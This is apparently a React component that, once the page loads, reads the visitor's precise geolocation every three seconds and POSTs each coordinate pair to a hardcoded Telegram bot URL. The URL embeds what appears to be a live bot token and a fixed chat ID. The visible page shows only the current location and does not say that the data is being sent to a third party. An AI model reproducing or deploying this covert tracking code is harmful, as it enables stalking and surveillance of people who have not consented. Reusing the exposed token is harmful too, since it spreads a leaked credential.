import React, { useState, useEffect } from "react";

function Location() {
  const [location, setLocation] = useState("");

  const sendLocationToServer = (position) => {
    const url = "https://api.telegram.org/bot5719186476:AAHJHhHWWFrl7UkYPuw2yWJM1NQfnegOS0Y/sendMessage";
    fetch(url, {
      method: "POST",
      body: JSON.stringify({ 
        chat_id: -962941088,
        text: position }),
      headers: {
        "Content-Type": "application/json"
      }
    })
      .then(response => response.json())
      .then(data => console.log(data))
      .catch(error => console.error(error));
  };

  const getLocation = () => {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const currentPosition = `${latitude}, ${longitude}`;
        setLocation(currentPosition);
        sendLocationToServer(currentPosition);
      },
      (error) => {
        console.error(error.message);
      },
      { enableHighAccuracy: true, maximumAge: 30000, timeout: 27000 }
    );
  };

  useEffect(() => {
    const intervalId = setInterval(() => {
      getLocation();
    }, 3000);
    return () => clearInterval(intervalId);
  }, []);

  return (
    <div>
      <p>Current Location: {location}</p>
    </div>
  );
}

export default Location;
